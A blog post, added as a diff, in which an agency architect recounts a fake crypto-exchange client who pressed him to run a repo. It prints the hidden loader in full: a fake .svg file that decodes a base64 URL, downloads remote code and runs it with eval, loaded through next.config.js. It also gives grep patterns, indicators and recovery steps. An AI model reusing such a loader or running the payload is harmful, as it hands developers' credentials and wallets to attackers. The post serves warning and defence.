@@ -1,0 +1,128 @@
+---
+title: "The $100K Client Who Wanted Me to Run His Code"
+publishedAt: "2026-09-27"
+summary: "A \"client\" offered us a $100,000 crypto exchange project, and the only thing he really wanted was for me to run his code on my laptop. The code would have handed my machine to a stranger."
+tags: ["security", "engineering", "scams"]
+image: "/static/images/the-100k-client-who-wanted-me-to-run-his-code/cover.png"
+---
+
+<img src="/static/images/the-100k-client-who-wanted-me-to-run-his-code/cover.png" alt="The $100K client who wanted me to run his code: a fake .svg file hiding an eval() call, loaded by next.config.js" />
+
+### How it started
+
+On a Monday night in September, an enquiry came in through our company website's contact form. The sender wanted a technical partner to build a centralized crypto exchange: spot trading, wallets and custody, deposits and withdrawals, KYC/AML, market data APIs, admin and risk tools. Nothing unusual about the list. It reads like every CEX brief I've seen.
+
+The details around it were odd though. The form's "Interest" field was set to Salesforce Implementation. The job title field said the company name again. The email came from a generic info@ address on the company's own domain, with no website in the signature, no phone number, no LinkedIn, and the messages were signed "Exchange Team".
+
+Then, in the second email, before anyone had spoken on a call: Phase 1 in three to four months, and "an initial planning envelope of approximately $100,000 USD."
+
+I've done pre-sales for a while now. Real clients almost never lead with a number. They make you work to find out the budget. Someone volunteering a big, round figure before the first call made me pause, but honestly I still thought it was just an eager founder. My co-founders replied, I was introduced as the technical architect, and I was asked for my GitHub username.
+
+### The ask: review it, and please run it
+
+The sender didn't want a meeting first. He wanted my review of their "existing MVP" first, so the call could "focus on the actual implementation." That sounds reasonable. It's actually a nice compliment to an engineer.
+
+I sent my username and got read-only access to a private repo the same day. Every email after that repeated the same line in slightly different words: "where feasible, please also set up and run the project so the assessment is based on the actual implementation." I counted it in four separate emails.
+
+An architecture review does not need the project running. You can assess a matching engine, a ledger design or a custody model by reading code. Running it is a nice-to-have. In these emails it was the one instruction that never went away.
+
+I accepted the invite, confirmed access, and then got busy with other work for a few days. When I finally sat down to start, the repo was gone. GitHub showed a 404. Access had been removed without a word.
+
+That was the moment my doubts added up. Before chasing access again, I stopped and did proper homework on who I was dealing with. I used an AI assistant to go through the whole email thread with me and dig into the company, the person and the code. What we found is below.
+
+### What was hidden in the code
+
+The company's GitHub organisation, which lists the same info@ email address, also has a public copy of the exchange repo. We read it as plain text. Nothing was installed or run.
+
+The README is polished. It has a feature list, a design system, emojis, install steps. There were even a couple of open issues written like a senior engineer's review: a P0 balance double-spend race condition, a deposit watcher that ignores chain reorgs. They make the project look alive and worth taking seriously.
+
+The interesting file is `src/assets/watermark.svg`. It has an .svg extension, it sits next to real image assets, and nobody opens an SVG in a code review. It isn't an image. This is the entire file:
+
+```js
+try { (async () => { const res = await require('axios').get(atob('aHR0cHM6Ly96b28tZXRhMS52ZXJjZWwuYXBwL3Rhc2svcGFyc2VyNT90b2tlbj0zMDI0ODg0NTY=')); eval(res.data); })(); } catch (err) { }
+```
+
+In plain English: decode a hidden URL, download whatever that server sends back, and execute it. Any error is swallowed silently, so you'd never see a thing. The base64 decodes to a Vercel-hosted endpoint with a per-victim token in it (listed at the end, defanged). I did not visit it.
+
+How does an SVG get executed? Through `next.config.js`, which starts like this:
+
+```js
+const watermark = require("./src/assets/watermark.svg");
+const noise = require("./src/assets/noise.svg");
+```
+
+`require()` doesn't care about the extension. Node treats the file as JavaScript and runs it. And `next.config.js` is loaded every time you run `npm run dev`, `next build`, `next start` or `next lint`. The `watermark` variable is then never used; the only line referencing it is commented out. Its whole job is to get loaded.
+
+The second file, `noise.svg`, is also JavaScript, but a harmless one that returns an SVG data URL. I think it's there as cover, so `require`-ing an .svg looks like a normal pattern in this codebase.
+
+Notice what it avoids: there's no `postinstall` script in `package.json`, which is the first place a careful developer checks. `npm install` alone doesn't trigger anything. The trap fires on the exact step the emails kept asking for: run the project.
+
+The git history tells the rest. The code began life as someone else's open-source P2P exchange for a different blockchain. The README still mentions that chain's wallet and has leftover notes like "if is compatible with svelte" and "TODO: Remember, the brand theme is western." The malicious file arrives in a single commit titled "replace project". Commit author names and dates are trivial to fake, so I'm not naming the author on those commits. They may well be an unrelated developer whose work was copied.
+
+Once `eval` runs, the payload can be anything. In the published write-ups of this same pattern, it's usually an infostealer: browser passwords and cookies, SSH keys, `.env` files and cloud credentials, crypto wallet extensions. On a consultant's laptop that means every client's credentials, not just yours.
+
+### The red flags, looking back
+
+None of these is proof on its own. Plenty of genuine founders have thin websites. Put together, they're a pattern.
+
+- **The budget came first.** $100K and a 3 to 4 month timeline, offered before a single call. Big, specific money is the bait.
+- **Code before conversation.** The sender preferred a code review before any meeting. Scammers avoid video calls because a face and a voice are harder to fake than an email.
+- **"Set up and run it" on repeat.** Four emails, the same instruction. A reviewer doesn't need to execute code to review it.
+- **A person with no footprint.** The sender's name returned nothing: no LinkedIn, no GitHub, no company page, no past work. The emails had no title and no phone number.
+- **A company with no footprint.** The GitHub org had two public repos, zero stars and no visible members. The site blocked automated checks. A similarly named domain was registered anonymously in August 2026 and is still a parked page.
+- **Inconsistent names.** The emails linked one spelling of the GitHub org, the repo I actually had access to used a second, and the public copy a third. Small things, but real companies keep their own name straight.
+- **Mismatched form data.** A crypto exchange project filed under "Salesforce Implementation", with the company name typed into the job title field. It looked like someone filling our form quickly and not caring what went in.
+- **A borrowed codebase.** The README had leftover notes from a different project on a different blockchain. The "MVP" was someone else's open-source code with a trap added.
+- **Access that disappeared.** Read access was removed a few days later without explanation. Whether that was to hide the evidence or to rotate the lure, a real client asking for a review doesn't quietly pull the code mid-review.
+
+What I'm honestly a bit embarrassed about: the flattering part worked on me at first. "We're not looking for developers to implement a spec, we're looking for a partner who can challenge our assumptions." That's exactly what a good architect wants to hear. Scams aimed at developers now read like good client briefs. The bad grammar era is over.
+
+### Before you touch a stranger's repo
+
+This is what I'm doing from now on, and what I'd ask any developer or agency to do.
+
+1. **Verify the humans before the code.** Get on a video call first. Look up the person and the company independently, not through links they sent. No footprint at all is a reason to slow down.
+2. **Treat "please run it locally" as a request to run a stranger's program on your machine.** Because that's what it is.
+3. **Read before you run.** Start with the files that execute automatically: `package.json` scripts (`preinstall`, `postinstall`, `prepare`), and every build config: `next.config.js`, `vite.config.*`, `webpack.config.*`, `postcss.config.js`, `tailwind.config.js`, `.eslintrc.js`, `babel.config.js`, `.vscode/tasks.json`, Makefiles, Dockerfiles.
+4. **Grep for the obvious.** `eval(`, `new Function`, `atob(`, `Buffer.from(... 'base64')`, `child_process`, and any `require()` or `import` of a non-code file (.svg, .png, .woff, .json). Also scroll right on long lines; payloads like to hide after a wall of whitespace.
+5. **Check the history, not just the README.** `git log --stat` shows when files appeared. A single commit called "replace project" or "update assets" that adds an odd file is worth a look.
+6. **If it has to run, isolate it.** A throwaway VM or cloud sandbox with no credentials, no SSH keys, no browser logins, no wallets and ideally no network. A clean run there still doesn't prove it's safe, since some payloads detect VMs, but at least the damage has nowhere to go.
+7. **Don't let your coding agent run it either.** An AI assistant that happily runs `npm run dev` on your laptop is you running it. Ask it to read and flag, not execute.
+8. **Keep pre-sales work off your main machine.** Unknown client code goes to a separate environment. Always.
+
+### If you already ran something like this
+
+I got lucky. I'd only opened the repo in a browser, and viewing code on GitHub runs nothing. If you did run `npm run dev` or a build on a repo like this, assume the machine is compromised and act from a different, clean device:
+
+1. Take the machine off the network.
+2. Change your email password first, then GitHub, and sign out every GitHub session and revoke personal access tokens.
+3. Rotate SSH keys, cloud credentials (AWS, GCP, Azure, Heroku and so on) and every API key that lived in a `.env` file on that machine.
+4. Move crypto to fresh wallets created on a clean device.
+5. Tell your clients if their credentials were on that laptop.
+6. Reinstall the OS. Cleaning up an unknown payload is guesswork.
+7. Report the repo to GitHub and the payload host to its provider's abuse team.
+
+And tell people. These campaigns keep working because the people they hit are embarrassed and stay quiet.
+
+### Indicators
+
+Defanged so nobody clicks them by accident.
+
+- **Email:** info\[@\]alphanexlab\[.\]com
+- **Domain:** alphanexlab\[.\]com
+- **Look-alike domain:** alphanexlab\[.\]online (registered 2026-08-06, parked)
+- **GitHub org (public copy):** github\[.\]com/AlphaNexLab/exchange
+- **GitHub org variants used in emails:** AlphaNex-Lab, AlphaNexLabs
+- **Malicious file:** src/assets/watermark.svg (JavaScript), loaded by next.config.js
+- **Payload URL:** hxxps://zoo-eta1\[.\]vercel\[.\]app/task/parser5?token=302488456
+- **Lure:** Crypto exchange (CEX) build, \~$100K budget, 3 to 4 month Phase 1, "review and run the MVP first"
+
+The lure came through our website contact form, so any agency with a contact form is a target. If you received something similar, I'd like to hear about it.
+
+### Sources
+
+- [Kaspersky: Malicious code in fake GitHub repositories (GitVenom)](https://www.kaspersky.com/blog/malicious-code-in-github/53085/)
+- [Decrypt: Crypto-stealing malware spread through fake GitHub repositories](https://decrypt.co/307806/crypto-stealing-malware-spread-through-fake-github-repositories-kaspersky-warns)
+- [DEV: A fake client sent me a GitHub repo. Running it cost me two days and every password I had](https://dev.to/vinimabreu/a-fake-client-sent-me-a-github-repo-running-it-cost-me-two-days-and-every-password-i-had-5bm)
+- [DEV: Fake job offers are turning GitHub repos into a trap](https://dev.to/xanderselorm/fake-job-offers-are-turning-github-repos-into-a-trap-5fad)
+- [ScamAdviser: alphanexlab.online](https://www.scamadviser.com/check-website/alphanexlab.online)
